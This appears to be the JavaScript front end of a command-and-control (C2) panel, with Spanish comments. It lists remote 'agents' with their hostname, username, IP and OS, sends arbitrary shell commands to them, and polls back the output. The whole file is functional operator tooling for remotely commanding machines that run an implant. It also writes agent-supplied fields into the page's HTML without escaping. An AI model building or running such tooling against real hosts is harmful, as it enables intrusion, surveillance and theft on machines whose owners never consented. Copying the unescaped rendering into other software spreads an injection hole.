// Dashboard JavaScript - Polling de agents, envío de comandos y auto-polling de resultados
const AUTH_TOKEN = window.C2_AUTH_TOKEN;
const API_BASE = '';
const POLL_INTERVAL = 5000;      // Agents: 5 segundos
const RESULT_POLL_INTERVAL = 3000; // Resultados: 3 segundos
const RESULT_POLL_MAX_ATTEMPTS = 20; // Máximo ~60s de polling por comando

// Almacén de resultados por agent
const agentResults = {};

// Agents con tareas pendientes de resultado
const pendingTasks = {}; // agent_id -> { attempts: N, intervalId: N }

// Obtener agents del servidor
async function fetchAgents() {
    try {
        const response = await fetch(`${API_BASE}/agents`, {
            headers: { 'X-Auth-Token': AUTH_TOKEN }
        });
        if (!response.ok) throw new Error('Failed to fetch agents');
        return await response.json();
    } catch (error) {
        console.error('Error fetching agents:', error);
        return null;
    }
}

// Enviar comando a un agent
async function sendCommand(agentId, command) {
    try {
        const response = await fetch(`${API_BASE}/task/${agentId}`, {
            method: 'POST',
            headers: {
                'X-Auth-Token': AUTH_TOKEN,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ command })
        });
        if (!response.ok) {
            const data = await response.json();
            throw new Error(data.error || data.reason || 'Failed to send command');
        }
        return await response.json();
    } catch (error) {
        console.error('Error sending command:', error);
        throw error;
    }
}

// Obtener resultados de un agent
async function fetchResults(agentId) {
    try {
        const response = await fetch(`${API_BASE}/results/${agentId}`, {
            headers: { 'X-Auth-Token': AUTH_TOKEN }
        });
        if (!response.ok) throw new Error('Failed to fetch results');
        return await response.json();
    } catch (error) {
        console.error('Error fetching results:', error);
        return null;
    }
}

// Calcular tiempo desde último visto
function timeAgo(timestamp) {
    const seconds = Math.floor(Date.now() / 1000 - timestamp);
    if (seconds < 60) return `${seconds}s ago`;
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
    return `${Math.floor(seconds / 3600)}h ago`;
}

// Detectar si un agente es local (testing)
function isLocalAgent(agent) {
    return agent.ip === '127.0.0.1' || agent.ip === '::1' || agent.ip.startsWith('127.');
}

// Renderizar un agent card
function renderAgent(agent) {
    const isOnline = agent.status === 'online';
    const result = agentResults[agent.agent_id];
    const testBadge = isLocalAgent(agent) ? '<span class="agent-badge-test">TEST</span>' : '';

    return `
        <div class="agent-card ${isOnline ? '' : 'offline'} ${isLocalAgent(agent) ? 'local-agent' : ''}">
            <div class="agent-header">
                <span class="agent-id">${agent.agent_id}</span>
                ${testBadge}
                <span class="agent-status ${agent.status}">${agent.status}</span>
            </div>
            <div class="agent-info">
                <div>
                    <label>Hostname</label>
                    <span>${agent.hostname}</span>
                </div>
                <div>
                    <label>Username</label>
                    <span>${agent.username}</span>
                </div>
                <div>
                    <label>IP</label>
                    <span>${agent.ip}</span>
                </div>
                <div>
                    <label>OS</label>
                    <span>${agent.os}</span>
                </div>
                <div>
                    <label>Last Seen</label>
                    <span>${timeAgo(agent.last_seen)}</span>
                </div>
            </div>
            <div class="agent-commands">
                <input type="text"
                       id="cmd-${agent.agent_id}"
                       placeholder="Enter command (whoami, ls, cat, ps...)"
                       onkeypress="if(event.key==='Enter') executeCommand('${agent.agent_id}')">
                <button onclick="executeCommand('${agent.agent_id}')">Send</button>
                <button onclick="refreshResults('${agent.agent_id}')" style="background: #666;">Refresh</button>
            </div>
            <div class="agent-result ${result ? 'visible' : ''} ${result?.error ? 'error' : 'success'}"
                 id="result-${agent.agent_id}">
                ${result ? (result.error || result.output || 'No output') : ''}
            </div>
        </div>
    `;
}

// Actualizar dashboard
async function updateDashboard() {
    const data = await fetchAgents();
    if (!data) return;

    const agents = data.agents || [];
    const online = agents.filter(a => a.status === 'online').length;
    const offline = agents.length - online;

    // Update stats
    document.getElementById('total-agents').textContent = agents.length;
    document.getElementById('online-agents').textContent = online;
    document.getElementById('offline-agents').textContent = offline;

    // Update agents list
    const container = document.getElementById('agents-list');
    if (agents.length === 0) {
        container.innerHTML = '<p class="loading">No agents connected</p>';
    } else {
        container.innerHTML = agents.map(renderAgent).join('');
    }
}

// Ejecutar comando
async function executeCommand(agentId) {
    const input = document.getElementById(`cmd-${agentId}`);
    const command = input.value.trim();
    if (!command) return;

    const resultDiv = document.getElementById(`result-${agentId}`);
    resultDiv.className = 'agent-result visible';
    resultDiv.textContent = 'Sending command...';

    try {
        await sendCommand(agentId, command);
        resultDiv.textContent = 'Command sent. Waiting for result...';
        input.value = '';

        // Iniciar auto-polling de resultados para este agent
        startResultPolling(agentId);
    } catch (error) {
        resultDiv.className = 'agent-result visible error';
        resultDiv.textContent = `Error: ${error.message}`;
    }
}

// Iniciar polling de resultados para un agent específico
function startResultPolling(agentId) {
    // Si ya hay polling activo, no duplicar
    if (pendingTasks[agentId]) {
        clearInterval(pendingTasks[agentId].intervalId);
    }

    pendingTasks[agentId] = { attempts: 0 };

    const intervalId = setInterval(async () => {
        pendingTasks[agentId].attempts++;

        const data = await fetchResults(agentId);
        const resultDiv = document.getElementById(`result-${agentId}`);

        if (data && data.results && data.results.length > 0) {
            const latest = data.results[data.results.length - 1];
            // Verificar si es un resultado nuevo (no el que ya teníamos)
            const prevOutput = agentResults[agentId]?.output;
            if (latest.output !== prevOutput) {
                agentResults[agentId] = { output: latest.output };
                if (resultDiv) {
                    resultDiv.className = 'agent-result visible success';
                    resultDiv.textContent = latest.output;
                }
                // Resultado recibido, detener polling
                stopResultPolling(agentId);
                return;
            }
        }

        // Detener si alcanzamos el máximo de intentos (~60s)
        if (pendingTasks[agentId]?.attempts >= RESULT_POLL_MAX_ATTEMPTS) {
            if (resultDiv) {
                resultDiv.className = 'agent-result visible';
                resultDiv.textContent = 'Waiting for agent to pick up command (check again later)...';
            }
            stopResultPolling(agentId);
        }
    }, RESULT_POLL_INTERVAL);

    pendingTasks[agentId].intervalId = intervalId;
}

// Detener polling de resultados para un agent
function stopResultPolling(agentId) {
    if (pendingTasks[agentId]) {
        clearInterval(pendingTasks[agentId].intervalId);
        delete pendingTasks[agentId];
    }
}

// Refrescar resultados de un agent (botón manual)
async function refreshResults(agentId) {
    const data = await fetchResults(agentId);
    const resultDiv = document.getElementById(`result-${agentId}`);

    if (data && data.results && data.results.length > 0) {
        const latest = data.results[data.results.length - 1];
        agentResults[agentId] = { output: latest.output };
        resultDiv.className = 'agent-result visible success';
        resultDiv.textContent = latest.output;
    } else {
        agentResults[agentId] = { output: 'No results yet' };
        resultDiv.className = 'agent-result visible';
        resultDiv.textContent = 'No results yet';
    }
}

// Iniciar polling
function init() {
    updateDashboard();
    setInterval(updateDashboard, POLL_INTERVAL);
}

// Start when DOM is ready
document.addEventListener('DOMContentLoaded', init);
